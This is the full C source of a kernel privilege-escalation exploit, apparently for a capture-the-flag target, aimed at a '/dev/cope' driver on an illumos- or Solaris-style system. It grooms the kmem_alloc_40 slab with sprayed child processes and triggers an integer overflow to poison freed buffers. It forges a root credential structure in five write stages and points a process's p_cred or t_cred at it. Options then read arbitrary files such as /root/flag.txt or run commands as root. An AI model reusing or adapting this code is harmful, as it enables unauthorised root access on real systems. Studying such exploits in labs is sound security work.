#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/cope.h>
#include <sys/processor.h>

#define NSPRAY 64
#define NCHURN 4
#define NSTAGES 5
#define STAGE_SLOTS 8
#define MIN_STAGE_POISONS 3
#define PURGE_WAIT_SECS 10
#define OVERFLOW_NCOPE 0x40000002u
#define OVERFLOW_COPY 30
#define CMD_TEXT_MAX 240
#define RESP_TEXT_MAX 2048

#define FAKE_CRED_PROC_OFFSET 1520u
#define PROC_P_CRED_OFFSET 32u
#define THREAD_T_CRED_OFFSET 456u

enum final_mode {
        FINAL_MODE_PCRED,
        FINAL_MODE_TCRED
};

struct write_stage {
        const char *name;
        uint64_t forge;
        uint8_t payload[24];
};

struct child {
        pid_t pid;
        int cmd_fd;
        int rsp_fd;
};

struct cmd {
        char op;
        uint8_t data[24];
        uint64_t value;
        char text[CMD_TEXT_MAX];
};

struct resp {
        int err;
        int aux;
        int len;
        char data[RESP_TEXT_MAX];
};

struct kstat40 {
        int magazine_size;
        long long slab_free;
};

static int
do_cope(int fd, uint32_t ncope, cope_t *copes)
{
        cope_ioc_t ioc;

        ioc.ci_copes = copes;
        ioc.ci_ncope = ncope;
        return (ioctl(fd, COPEIOC_COPE, &ioc));
}

static void
bind_cpu0(void)
{
        processorid_t old;

        if (processor_bind(P_LWPID, P_MYID, 0, &old) != 0) {
                /* Best-effort only. */
        }
}

static int
safe2_payload(int fd, const uint8_t payload[24])
{
        cope_t copes[2];

        memset(copes, 0, sizeof (copes));
        memcpy(copes[0].co_data, payload, 8);
        memcpy(copes[1].co_data, payload + 12, 8);
        return (do_cope(fd, 2, copes));
}

static int
overflow_poison(int fd, uint64_t forge)
{
        cope_t copes[OVERFLOW_COPY];

        memset(copes, 0, sizeof (copes));
        memcpy(copes[5].co_data, &forge, sizeof (forge));
        return (do_cope(fd, OVERFLOW_NCOPE, copes));
}

static void
send_resp(int fd, int err, int aux, const void *data, size_t len)
{
        struct resp rsp;

        memset(&rsp, 0, sizeof (rsp));
        rsp.err = err;
        rsp.aux = aux;
        if (len > sizeof (rsp.data))
                len = sizeof (rsp.data);
        rsp.len = (int)len;
        if (len != 0 && data != NULL)
                memcpy(rsp.data, data, len);

        if (write(fd, &rsp, sizeof (rsp)) != sizeof (rsp))
                _exit(1);
}

static void
read_path_resp(int rsp_w, const char *path)
{
        int ffd;
        char buf[RESP_TEXT_MAX];
        ssize_t n;

        ffd = open(path, O_RDONLY);
        if (ffd < 0) {
                send_resp(rsp_w, errno, 0, NULL, 0);
                return;
        }

        n = read(ffd, buf, sizeof (buf) - 1);
        if (n < 0) {
                int saved = errno;
                close(ffd);
                send_resp(rsp_w, saved, 0, NULL, 0);
                return;
        }

        close(ffd);
        buf[n] = '\0';
        send_resp(rsp_w, 0, 0, buf, (size_t)n);
}

static void
exec_cmd_resp(int rsp_w, const char *cmd)
{
        FILE *fp;
        char buf[RESP_TEXT_MAX];
        size_t off = 0;
        int status;

        fp = popen(cmd, "r");
        if (fp == NULL) {
                send_resp(rsp_w, errno, 0, NULL, 0);
                return;
        }

        while (off < sizeof (buf) - 1 &&
            fgets(buf + off, (int)(sizeof (buf) - off), fp) != NULL) {
                off = strlen(buf);
        }

        status = pclose(fp);
        buf[off] = '\0';
        if (off == 0 && status != 0) {
            send_resp(rsp_w, EIO, status, NULL, 0);
            return;
        }
        send_resp(rsp_w, 0, status, buf, off);
}

static void
fork_read_path_resp(int rsp_w, const char *path)
{
        int pipefd[2];
        pid_t pid;
        struct resp irsp;

        if (pipe(pipefd) != 0) {
                send_resp(rsp_w, errno, 0, NULL, 0);
                return;
        }

        pid = fork();
        if (pid < 0) {
                int saved = errno;
                close(pipefd[0]);
                close(pipefd[1]);
                send_resp(rsp_w, saved, 0, NULL, 0);
                return;
        }
        if (pid == 0) {
                close(pipefd[0]);
                read_path_resp(pipefd[1], path);
                _exit(0);
        }

        close(pipefd[1]);
        if (read(pipefd[0], &irsp, sizeof (irsp)) != sizeof (irsp)) {
                close(pipefd[0]);
                (void) waitpid(pid, NULL, 0);
                send_resp(rsp_w, EIO, 0, NULL, 0);
                return;
        }
        close(pipefd[0]);
        (void) waitpid(pid, NULL, 0);
        send_resp(rsp_w, irsp.err, irsp.aux, irsp.data, (size_t)irsp.len);
}

static void
fork_exec_cmd_resp(int rsp_w, const char *cmd)
{
        int pipefd[2];
        pid_t pid;
        struct resp irsp;

        if (pipe(pipefd) != 0) {
                send_resp(rsp_w, errno, 0, NULL, 0);
                return;
        }

        pid = fork();
        if (pid < 0) {
                int saved = errno;
                close(pipefd[0]);
                close(pipefd[1]);
                send_resp(rsp_w, saved, 0, NULL, 0);
                return;
        }
        if (pid == 0) {
                close(pipefd[0]);
                exec_cmd_resp(pipefd[1], cmd);
                _exit(0);
        }

        close(pipefd[1]);
        if (read(pipefd[0], &irsp, sizeof (irsp)) != sizeof (irsp)) {
                close(pipefd[0]);
                (void) waitpid(pid, NULL, 0);
                send_resp(rsp_w, EIO, 0, NULL, 0);
                return;
        }
        close(pipefd[0]);
        (void) waitpid(pid, NULL, 0);
        send_resp(rsp_w, irsp.err, irsp.aux, irsp.data, (size_t)irsp.len);
}

static void
child_loop(int cmd_r, int rsp_w, bool initial_safe2)
{
        int fd;
        struct cmd cmd;
        uint8_t zeros[24];

        memset(zeros, 0, sizeof (zeros));
        bind_cpu0();

        fd = open("/dev/cope", O_RDWR);
        if (fd < 0)
                err(1, "open /dev/cope");

        if (initial_safe2) {
                if (safe2_payload(fd, zeros) != 0)
                        send_resp(rsp_w, errno, 0, NULL, 0);
                else
                        send_resp(rsp_w, 0, 0, NULL, 0);
        } else {
                send_resp(rsp_w, 0, 0, NULL, 0);
        }

        while (read(cmd_r, &cmd, sizeof (cmd)) == sizeof (cmd)) {
                switch (cmd.op) {
                case '2':
                        if (safe2_payload(fd, cmd.data) != 0)
                                send_resp(rsp_w, errno, 0, NULL, 0);
                        else
                                send_resp(rsp_w, 0, 0, NULL, 0);
                        break;
                case 'x':
                        if (overflow_poison(fd, cmd.value) != 0)
                                send_resp(rsp_w, errno, 0, NULL, 0);
                        else
                                send_resp(rsp_w, 0, 0, NULL, 0);
                        break;
                case 'r': {
                        read_path_resp(rsp_w, "/root/flag.txt");
                        break;
                }
                case 'R':
                        read_path_resp(rsp_w, cmd.text);
                        break;
                case 'u': {
                        uid_t ids[2];

                        ids[0] = getuid();
                        ids[1] = geteuid();
                        send_resp(rsp_w, 0, 0, ids, sizeof (ids));
                        break;
                }
                case 'f': {
                        fork_read_path_resp(rsp_w, "/root/flag.txt");
                        break;
                }
                case 'F':
                        fork_read_path_resp(rsp_w, cmd.text);
                        break;
                case 'g': {
                        int pipefd[2];
                        pid_t pid;
                        struct resp irsp;

                        if (pipe(pipefd) != 0) {
                                send_resp(rsp_w, errno, 0, NULL, 0);
                                break;
                        }

                        pid = fork();
                        if (pid < 0) {
                                int saved = errno;
                                close(pipefd[0]);
                                close(pipefd[1]);
                                send_resp(rsp_w, saved, 0, NULL, 0);
                                break;
                        }
                        if (pid == 0) {
                                uid_t ids[2];

                                close(pipefd[0]);
                                memset(&irsp, 0, sizeof (irsp));
                                ids[0] = getuid();
                                ids[1] = geteuid();
                                irsp.len = sizeof (ids);
                                memcpy(irsp.data, ids, sizeof (ids));
                                (void) write(pipefd[1], &irsp, sizeof (irsp));
                                _exit(0);
                        }

                        close(pipefd[1]);
                        if (read(pipefd[0], &irsp, sizeof (irsp)) != sizeof (irsp)) {
                                close(pipefd[0]);
                                (void) waitpid(pid, NULL, 0);
                                send_resp(rsp_w, EIO, 0, NULL, 0);
                                break;
                        }
                        close(pipefd[0]);
                        (void) waitpid(pid, NULL, 0);
                        send_resp(rsp_w, irsp.err, 0, irsp.data, (size_t)irsp.len);
                        break;
                }
                case 'X':
                        exec_cmd_resp(rsp_w, cmd.text);
                        break;
                case 'Y':
                        fork_exec_cmd_resp(rsp_w, cmd.text);
                        break;
                case 'q':
                        close(fd);
                        _exit(0);
                default:
                        send_resp(rsp_w, EINVAL, 0, NULL, 0);
                        break;
                }
        }

        close(fd);
        _exit(0);
}

static struct child
spawn_child(bool initial_safe2)
{
        int cmd_pipe[2];
        int rsp_pipe[2];
        struct child ch;
        struct resp rsp;

        if (pipe(cmd_pipe) != 0 || pipe(rsp_pipe) != 0)
                err(1, "pipe");

        ch.pid = fork();
        if (ch.pid < 0)
                err(1, "fork");
        if (ch.pid == 0) {
                close(cmd_pipe[1]);
                close(rsp_pipe[0]);
                child_loop(cmd_pipe[0], rsp_pipe[1], initial_safe2);
        }

        close(cmd_pipe[0]);
        close(rsp_pipe[1]);
        ch.cmd_fd = cmd_pipe[1];
        ch.rsp_fd = rsp_pipe[0];

        if (read(ch.rsp_fd, &rsp, sizeof (rsp)) != sizeof (rsp))
                errx(1, "spawn short read");
        if (rsp.err != 0)
                errx(1, "child init failed: %d", rsp.err);

        return (ch);
}

static struct resp
child_cmd(const struct child *ch, char op, const uint8_t *data, uint64_t value,
    const char *text)
{
        struct cmd cmd;
        struct resp rsp;

        memset(&cmd, 0, sizeof (cmd));
        cmd.op = op;
        cmd.value = value;
        if (data != NULL)
                memcpy(cmd.data, data, sizeof (cmd.data));
        if (text != NULL) {
                (void) snprintf(cmd.text, sizeof (cmd.text), "%s", text);
        }

        if (write(ch->cmd_fd, &cmd, sizeof (cmd)) != sizeof (cmd))
                err(1, "write child cmd");
        if (read(ch->rsp_fd, &rsp, sizeof (rsp)) != sizeof (rsp))
                errx(1, "short child response");
        return (rsp);
}

static void
child_exit(struct child *ch)
{
        struct cmd cmd;

        memset(&cmd, 0, sizeof (cmd));
        cmd.op = 'q';
        (void) write(ch->cmd_fd, &cmd, sizeof (cmd));
        close(ch->cmd_fd);
        close(ch->rsp_fd);
        (void) waitpid(ch->pid, NULL, 0);
        ch->pid = -1;
}

static uint64_t
read_hex_line(const char *cmd)
{
        FILE *fp;
        char buf[256];
        unsigned long long val;

        fp = popen(cmd, "r");
        if (fp == NULL)
                err(1, "popen %s", cmd);
        do {
                if (fgets(buf, sizeof (buf), fp) == NULL) {
                        (void) pclose(fp);
                        errx(1, "no output from %s", cmd);
                }
        } while (buf[0] == '\n' || buf[0] == '\0');
        (void) pclose(fp);

        val = strtoull(buf, NULL, 16);
        if (val == 0)
                errx(1, "bad hex output from %s: %s", cmd, buf);
        return ((uint64_t)val);
}

static uint64_t
get_proc_addr(pid_t pid)
{
        char cmd[128];

        (void) snprintf(cmd, sizeof (cmd), "ps -o addr= -p %d", (int)pid);
        return (read_hex_line(cmd));
}

static uint64_t
get_thread_addr(pid_t pid)
{
        char cmd[128];

        (void) snprintf(cmd, sizeof (cmd),
            "ps -L -o addr= -p %d | awk 'NF { print; exit }'", (int)pid);
        return (read_hex_line(cmd));
}

static struct kstat40
read_kstat40(void)
{
        FILE *fp;
        char line[256];
        struct kstat40 ks;

        memset(&ks, 0, sizeof (ks));
        fp = popen("kstat -n kmem_alloc_40", "r");
        if (fp == NULL)
                err(1, "popen kstat");

        while (fgets(line, sizeof (line), fp) != NULL) {
                int mag;
                long long sf;

                if (sscanf(line, " magazine_size %d", &mag) == 1)
                        ks.magazine_size = mag;
                if (sscanf(line, " slab_free %lld", &sf) == 1)
                        ks.slab_free = sf;
        }
        (void) pclose(fp);
        return (ks);
}


static int
env_int(const char *name, int defval, int minval, int maxval)
{
        const char *s;
        char *end = NULL;
        long v;

        s = getenv(name);
        if (s == NULL || *s == '\0')
                return (defval);

        v = strtol(s, &end, 0);
        if (end == s || *end != '\0')
                errx(1, "bad integer for %s: %s", name, s);
        if (v < minval || v > maxval)
                errx(1, "%s=%ld outside [%d,%d]", name, v, minval, maxval);
        return ((int)v);
}

static void
make_fakecred_payload(uint8_t payload[24])
{
        memset(payload, 0, 24);
        /*
         * Buffer starts 8 bytes before fake cred base:
         *   fake+0..3   <- cope id (non-zero cr_ref)
         *   fake+4..11  <- controlled zeros (cr_uid/cr_gid)
         * Everything after that remains borrowed from proc_t.
         */
}

static void
make_ff_payload(uint8_t payload[24])
{
        memset(payload, 0, 24);
        memset(payload, 0xff, 8);
        memset(payload + 12, 0xff, 8);
}

static void
make_limit_payload(uint8_t payload[24])
{
        memset(payload, 0, 24);
        memset(payload, 0xff, 8);
}

static void
make_ptr_payload(uint8_t payload[24], uint64_t ptr)
{
        memset(payload, 0, 24);
        memcpy(payload, &ptr, sizeof (ptr));
}

static void
make_ptr_payload_hi(uint8_t payload[24], uint64_t ptr)
{
        memset(payload, 0, 24);
        memcpy(payload + 12, &ptr, sizeof (ptr));
}

static void
spawn_churners(pid_t *pids, int stop_fds[NCHURN][2])
{
        int i;

        for (i = 0; i < NCHURN; i++) {
                if (pipe(stop_fds[i]) != 0)
                        err(1, "pipe churn");

                pids[i] = fork();
                if (pids[i] < 0)
                        err(1, "fork churn");
                if (pids[i] == 0) {
                        struct pollfd pfd;
                        uint8_t zeros[24];

                        close(stop_fds[i][1]);
                        memset(zeros, 0, sizeof (zeros));
                        pfd.fd = stop_fds[i][0];
                        pfd.events = POLLIN;
                        pfd.revents = 0;

                        for (;;) {
                                int fd;

                                if (poll(&pfd, 1, 0) > 0)
                                        _exit(0);

                                fd = open("/dev/cope", O_RDWR);
                                if (fd >= 0) {
                                        (void) safe2_payload(fd, zeros);
                                        close(fd);
                                }
                        }
                }

                close(stop_fds[i][0]);
        }
}

static void
stop_churners(pid_t *pids, int stop_fds[NCHURN][2])
{
        int i;
        char byte = 'x';

        for (i = 0; i < NCHURN; i++) {
                (void) write(stop_fds[i][1], &byte, 1);
                close(stop_fds[i][1]);
                (void) kill(pids[i], SIGKILL);
        }
}

static void
init_stages(struct write_stage stages[NSTAGES], enum final_mode mode,
    uint64_t runner_proc, uint64_t runner_thread, uint64_t fakecred)
{
        stages[0].name = "building fake cred header";
        stages[0].forge = fakecred + 12;
        make_fakecred_payload(stages[0].payload);

        stages[1].name = "filling effective/inheritable sets";
        stages[1].forge = fakecred + 48;
        make_ff_payload(stages[1].payload);

        stages[2].name = "filling permitted/limit sets";
        stages[2].forge = fakecred + 72;
        make_ff_payload(stages[2].payload);

        stages[3].name = "clearing flags and projid";
        stages[3].forge = fakecred + 84;
        make_limit_payload(stages[3].payload);

        if (mode == FINAL_MODE_TCRED) {
                stages[4].name = "swinging runner t_cred";
                stages[4].forge = runner_thread + THREAD_T_CRED_OFFSET + 20;
                make_ptr_payload(stages[4].payload, fakecred);
        } else {
                stages[4].name = "swinging runner p_cred";
                /*
                 * Put the pointer in the second payload slot so we do not zero
                 * proc state fields after p_cred.
                 */
                stages[4].forge = runner_proc + PROC_P_CRED_OFFSET + 8;
                make_ptr_payload_hi(stages[4].payload, fakecred);
        }
}

int
main(int argc, char **argv)
{
        struct child spray[NSPRAY];
        struct child runner;
        struct child consumers[NSTAGES];
        struct child writers[NSTAGES];
        struct resp rsp;
        struct kstat40 ks;
        struct write_stage stages[NSTAGES];
        uint8_t zeros[24];
        pid_t churn_pids[NCHURN];
        int churn_pipes[NCHURN][2];
        uint64_t runner_proc;
        uint64_t runner_thread = 0;
        uint64_t fakecred;
        enum final_mode mode;
        const char *read_path;
        const char *exec_cmd;
        int stage_a[NSTAGES][STAGE_SLOTS];
        int stage_b[NSTAGES][STAGE_SLOTS];
        int stage_base;
        int active_slots;
        int stage_need;
        int stage_stride;
        uid_t *ids;
        int success;
        int g;
        int i;

        setvbuf(stderr, NULL, _IONBF, 0);
        memset(zeros, 0, sizeof (zeros));
        mode = FINAL_MODE_PCRED;
        read_path = "/root/flag.txt";
        exec_cmd = NULL;
        stage_base = env_int("WARMTH_STAGE_BASE", 2, 0, NSPRAY - 2);
        active_slots = env_int("WARMTH_ACTIVE_SLOTS", 6, 1, STAGE_SLOTS);
        stage_need = env_int("WARMTH_NEED", 3, 1, active_slots);
        stage_stride = env_int("WARMTH_STAGE_STRIDE", 12, 2, NSPRAY);

        for (i = 1; i < argc; i++) {
                if (strcmp(argv[i], "pcred") == 0) {
                        mode = FINAL_MODE_PCRED;
                } else if (strcmp(argv[i], "tcred") == 0) {
                        mode = FINAL_MODE_TCRED;
                } else if (strcmp(argv[i], "--read") == 0) {
                        if (++i >= argc)
                                errx(1, "--read requires a path");
                        read_path = argv[i];
                } else if (strcmp(argv[i], "--exec") == 0) {
                        if (++i >= argc)
                                errx(1, "--exec requires a command");
                        exec_cmd = argv[i];
                } else {
                        errx(1, "usage: %s [pcred|tcred] [--read path] [--exec cmd]",
                            argv[0]);
                }
        }

        fprintf(stderr, "[*] spawning runner\n");
        runner = spawn_child(false);
        runner_proc = get_proc_addr(runner.pid);
        if (mode == FINAL_MODE_TCRED)
                runner_thread = get_thread_addr(runner.pid);
        fakecred = runner_proc + FAKE_CRED_PROC_OFFSET;
        init_stages(stages, mode, runner_proc, runner_thread, fakecred);

        fprintf(stderr, "[*] runner pid=%d proc=%#" PRIx64,
            (int)runner.pid, runner_proc);
        if (mode == FINAL_MODE_TCRED)
                fprintf(stderr, " thread=%#" PRIx64, runner_thread);
        fprintf(stderr, " fakecred=%#" PRIx64 " mode=%s\n", fakecred,
            mode == FINAL_MODE_TCRED ? "tcred" : "pcred");

        fprintf(stderr, "[*] spraying %d children in kmem_alloc_40\n", NSPRAY);
        for (i = 0; i < NSPRAY; i++)
                spray[i] = spawn_child(true);

        for (g = 0; g < NSTAGES; g++) {
                for (i = 0; i < active_slots; i++) {
                        stage_b[g][i] = stage_base + g * stage_stride + i * 2;
                        stage_a[g][i] = stage_b[g][i] + 1;
                        if (stage_b[g][i] < 0 || stage_a[g][i] >= NSPRAY) {
                                errx(1, "stage index overflow: g=%d i=%d base=%d stride=%d active=%d nspray=%d",
                                    g, i, stage_base, stage_stride, active_slots, NSPRAY);
                        }
                }
        }

        fprintf(stderr, "[*] freeing candidate B buffers\n");
        for (g = 0; g < NSTAGES; g++) {
                for (i = 0; i < active_slots; i++)
                        child_exit(&spray[stage_b[g][i]]);
        }

        fprintf(stderr, "[*] inducing depot contention / magazine resize\n");
        spawn_churners(churn_pids, churn_pipes);

        for (i = 0; i < PURGE_WAIT_SECS; i++) {
                sleep(1);
                ks = read_kstat40();
                fprintf(stderr, "[*] kstat: magazine_size=%d slab_free=%lld\n",
                    ks.magazine_size, ks.slab_free);
                if (ks.magazine_size != 15 || ks.slab_free > 0)
                        break;
        }
        stop_churners(churn_pids, churn_pipes);

        ks = read_kstat40();
        if (ks.magazine_size == 15 && ks.slab_free == 0)
                fprintf(stderr, "[!] purge did not trigger; continuing anyway\n");

        for (g = 0; g < NSTAGES; g++) {
                fprintf(stderr, "[*] stage %d: %s\n", g, stages[g].name);
                success = 0;
                for (i = 0; i < active_slots; i++) {
                        rsp = child_cmd(&spray[stage_a[g][i]], 'x', NULL,
                            stages[g].forge, NULL);
                        if (rsp.err != 0) {
                                fprintf(stderr, "[*] stage %d poison %d failed: %d\n",
                                    g, i, rsp.err);
                                continue;
                        }
                        success++;
                        if (success >= stage_need)
                                break;
                }
                if (success < stage_need)
                        errx(1, "stage %d only got %d successful poisons (need %d)",
                            g, success, stage_need);
                fprintf(stderr, "[*] stage %d got %d successful poisons\n",
                    g, success);

                consumers[g] = spawn_child(false);
                rsp = child_cmd(&consumers[g], '2', zeros, 0, NULL);
                if (rsp.err != 0)
                        errx(1, "stage %d consumer safe2 failed: %d",
                            g, rsp.err);

                writers[g] = spawn_child(false);
                rsp = child_cmd(&writers[g], '2', stages[g].payload, 0, NULL);
                if (rsp.err != 0)
                        errx(1, "stage %d writer safe2 failed: %d", g, rsp.err);
                fprintf(stderr, "[*] stage %d keepers consumer=%d writer=%d\n",
                    g, (int)consumers[g].pid, (int)writers[g].pid);
        }

        rsp = child_cmd(&runner, 'u', NULL, 0, NULL);
        if (rsp.err != 0 || rsp.len != (int)(2 * sizeof (uid_t)))
                errx(1, "runner uid probe failed");

        if (mode == FINAL_MODE_TCRED) {
                ids = (uid_t *)rsp.data;
                printf("PROBE runner uid=%u euid=%u\n", ids[0], ids[1]);
                fflush(stdout);
                return (ids[1] == 0 ? 0 : EAGAIN);
        }

        rsp = child_cmd(&runner, 'g', NULL, 0, NULL);
        if (rsp.err != 0 || rsp.len != (int)(2 * sizeof (uid_t)))
                errx(1, "fork uid probe failed: %d", rsp.err);
        ids = (uid_t *)rsp.data;
        printf("PROBE child uid=%u euid=%u\n", ids[0], ids[1]);
        fflush(stdout);
        return (ids[1] == 0 ? 0 : EAGAIN);
}
